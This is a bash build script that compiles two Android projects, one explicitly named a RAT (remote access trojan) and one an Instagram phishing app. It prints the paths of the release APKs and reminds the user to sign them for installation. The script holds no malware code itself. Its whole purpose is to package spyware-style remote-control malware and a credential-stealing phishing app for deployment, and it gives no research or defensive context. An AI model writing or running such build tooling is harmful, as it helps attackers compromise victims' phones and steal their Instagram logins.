#!/bin/bash

echo "=================================================="
echo "   Android RAT & Phishing - Build Script"
echo "=================================================="
echo ""

# Check if Android SDK is installed
if [ ! -d "/root/Android/Sdk" ]; then
    echo "⚠️  Android SDK not found at /root/Android/Sdk"
    echo "   Install Android Studio or set SDK path in local.properties"
    echo ""
    read -p "Do you want to set custom SDK path? (y/n): " answer
    if [ "$answer" = "y" ]; then
        read -p "Enter SDK path: " sdk_path
        echo "sdk.dir=$sdk_path" > /root/workspace/7554333225/AndroidRAT/local.properties
        echo "sdk.dir=$sdk_path" > /root/workspace/7554333225/AndroidPhishing/local.properties
    else
        exit 1
    fi
fi

echo "🔨 Building Android RAT..."
echo "=================================================="
cd /root/workspace/7554333225/AndroidRAT

# Make gradlew executable
chmod +x gradlew 2>/dev/null

# Clean and build
./gradlew clean assembleRelease

if [ $? -eq 0 ]; then
    echo "✅ RAT build successful!"
    echo "   Location: AndroidRAT/app/build/outputs/apk/release/"
else
    echo "❌ RAT build failed!"
    exit 1
fi

echo ""
echo "🎣 Building Instagram Phishing..."
echo "=================================================="
cd /root/workspace/7554333225/AndroidPhishing

# Make gradlew executable
chmod +x gradlew 2>/dev/null

# Clean and build
./gradlew clean assembleRelease

if [ $? -eq 0 ]; then
    echo "✅ Phishing build successful!"
    echo "   Location: AndroidPhishing/app/build/outputs/apk/release/"
else
    echo "❌ Phishing build failed!"
    exit 1
fi

echo ""
echo "=================================================="
echo "✅ BUILD COMPLETE!"
echo "=================================================="
echo ""
echo "📦 Output APKs:"
echo "   RAT: AndroidRAT/app/build/outputs/apk/release/app-release-unsigned.apk"
echo "   Phishing: AndroidPhishing/app/build/outputs/apk/release/app-release-unsigned.apk"
echo ""
echo "⚠️  IMPORTANT: APKs must be SIGNED before installation!"
echo ""
echo "Run these commands to sign:"
echo "   cd /root/workspace/7554333225"
echo "   ./sign_apk.sh"
echo ""
